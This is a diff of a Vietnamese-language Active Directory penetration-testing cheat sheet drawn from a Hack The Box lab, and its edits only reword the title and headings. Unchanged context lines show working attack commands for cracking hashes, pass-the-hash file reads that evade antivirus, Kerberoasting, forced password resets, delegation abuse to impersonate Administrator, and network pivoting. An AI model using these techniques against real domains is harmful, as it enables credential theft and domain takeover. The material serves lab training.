@@ -1,4 +1,4 @@
-# Active Directory Pentest Cheat Sheet — rút ra từ HTB Pro Lab Zephyr
+# Active Directory Pentest Cheat Sheet
 
 > Tổng hợp kỹ thuật, câu lệnh và lỗ hổng/misconfiguration AD đã khai thác trong AD (multi-forest: `painters.htb` ↔ `zsm.local`/`internal.zsm.local`).
 
@@ -51,7 +51,7 @@ Forest Compromise
 Back Tracking (loot reuse)
 ```
 
-**Nguyên tắc xuyên suốt:** mỗi máy chiếm được không chỉ là mục tiêu, mà là **nguồn credential/loot** cho bước kế tiếp — không có bước nào độc lập.
+**Nguyên tắc:** mỗi máy chiếm được không chỉ là mục tiêu, mà là **nguồn credential/loot** cho bước kế tiếp — không có bước nào độc lập.
 
 ---
 
@@ -128,7 +128,7 @@ hashcat -m 5600 hash.txt rockyou.txt --force
 | Đọc file thuần qua SMB (né AV) | `smbclient.py <domain>/<user>@<ip> -hashes <hash>` rồi `get <file>` | Không exec, không tạo file tạm → không bị Defender chặn |
 | Cần hostname/SPN chính xác | Kerberos ticket chỉ hợp lệ cho đúng SPN đã cấp | Luôn map hostname vào `/etc/hosts` khi làm việc với Kerberos |
 
-> **Bài học quan trọng:** NTLM PtH với username không kèm domain (`-u Administrator`) sẽ bị hiểu là **local logon** — phải chỉ định `'<domain>\Administrator'` khi hash là của domain account, nếu không auth sẽ fail dù hash đúng.
+> **Lưu ý quan trọng:** NTLM PtH với username không kèm domain (`-u Administrator`) sẽ bị hiểu là **local logon** — phải chỉ định `'<domain>\Administrator'` khi hash là của domain account, nếu không auth sẽ fail dù hash đúng.
 
 ---
 
@@ -142,7 +142,7 @@ Bất kỳ domain user nào cũng có quyền request TGS cho SPN bất kỳ (h�
 GetUserSPNs.py <domain>/<user> -dc-ip <dc> -request-user <target_spn_account>
 ```
 
-### ACL Abuse — Force-Change-Password
+### ACL Abuse - Force-Change-Password
 
 Quyền `User-Force-Change-Password` cho phép đặt lại mật khẩu người khác **không cần biết mật khẩu cũ**.
 
@@ -153,7 +153,7 @@ rpcclient $> setuserinfo2 <target> 23 '<newpass>'
 
 > **Lưu ý:** module `netexec ... -M change-password` gọi API SAMR `ChangePasswordUser2` — chỉ tự đổi mật khẩu **của chính principal đang auth**, không đổi được của người khác dù truyền `USERNAME=<target>`. Phải dùng `rpcclient setuserinfo2` (level 23) mới đúng API Force-Change-Password.
 
-### Constrained Delegation — S4U2Self + S4U2Proxy
+### Constrained Delegation - S4U2Self + S4U2Proxy
 
 ```bash
 getST.py -spn '<service>/<host>' -impersonate 'Administrator' '<domain>/<user>:<pass>' -dc-ip <dc>
@@ -262,7 +262,7 @@ tunnel_start --tun ligoloN
 sudo ip route add <subnet>/24 dev ligoloN
 ```
 
-> **Nguyên tắc:** khi firewall/VLAN chặn route từ điểm pivot hiện tại tới một subnet mới, triển khai thêm agent **trên chính máy đã xác nhận có route** (kiểm tra bằng `Test-NetConnection`/ARP cache từ máy đó) — không phải trên máy attacker.
+> **Nguyên tắc:** khi firewall/VLAN chặn route từ điểm pivot hiện tại tới một subnet mới, triển khai thêm agent **trên chính máy đã xác nhận có route** (kiểm tra bằng `Test-NetConnection`/ARP cache từ máy đó) - không phải trên máy attacker.
 
 ---
 
